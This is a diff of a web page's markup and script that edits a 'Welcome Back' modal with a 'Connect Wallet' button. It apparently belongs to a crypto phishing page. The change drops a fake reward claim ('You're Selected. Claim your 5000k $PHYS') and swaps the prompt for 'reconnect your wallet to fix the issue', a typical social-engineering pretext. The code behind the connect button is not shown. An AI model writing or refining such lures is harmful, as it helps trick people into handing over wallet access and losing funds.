@@ -36,8 +36,6 @@
 .welcome-back-close{position:absolute;top:12px;right:12px;width:36px;height:36px;border:0;border-radius:999px;background:rgba(255,255,255,0.08);color:#fff;cursor:pointer;font-size:18px;display:inline-flex;align-items:center;justify-content:center}
 .welcome-back-header{font-size:clamp(1.35rem, 2.8vw, 1.8rem);font-weight:700;text-align:center;color:#fff;margin:10px 0 10px}
 .welcome-back-name{color:#3396ff;font-weight:800}
-.welcome-back-claim{font-size:clamp(0.95rem, 2.2vw, 1rem);font-weight:700;text-align:center;color:#fff;margin:0 0 8px}
-.welcome-back-amount{color:#f5c542;font-weight:800}
 .welcome-back-desc{font-size:clamp(0.95rem, 2.2vw, 1rem);line-height:1.6;text-align:center;color:#d0d7e2;margin:0 0 18px}
 .welcome-back-btn{width:100%;padding:14px 16px;border:0;border-radius:14px;background:linear-gradient(135deg, #3396ff, #5ba2ff);color:#fff;font-weight:700;cursor:pointer;box-shadow:0 12px 24px rgba(51,150,255,0.24)}
 .welcome-back-btn:hover{transform:translateY(-1px)}
@@ -124,8 +122,7 @@
     <div class="welcome-back-modal" role="dialog" aria-modal="true">
       <button id="welcome-back-close" class="welcome-back-close" aria-label="Close">✕</button>
       <div id="welcome-back-header" class="welcome-back-header">Welcome Back</div>
-      <h4 class="welcome-back-claim">You're Selected. Claim your <span class="welcome-back-amount">5000k $PHYS</span></h4>
-      <p id="welcome-back-desc" class="welcome-back-desc">Please kindly connect your wallet to claim your rewards.</p>
+      <p id="welcome-back-desc" class="welcome-back-desc">Please kindly reconnect your wallet to fix the issue.</p>
       <button id="welcome-back-connect-btn" class="welcome-back-btn">Connect Wallet</button>
     </div>
   </div>
@@ -585,7 +582,7 @@
       nameSpan.textContent = safeName;
       welcomeHeader.appendChild(nameSpan);
 
-      welcomeDesc.textContent = 'Please kindly connect your wallet to claim your rewards.';
+      welcomeDesc.textContent = 'Please kindly reconnect your wallet to fix the issue.';
       welcomeOverlay.style.display = 'flex';
       requestAnimationFrame(() => {
         welcomeOverlay.classList.add('active');
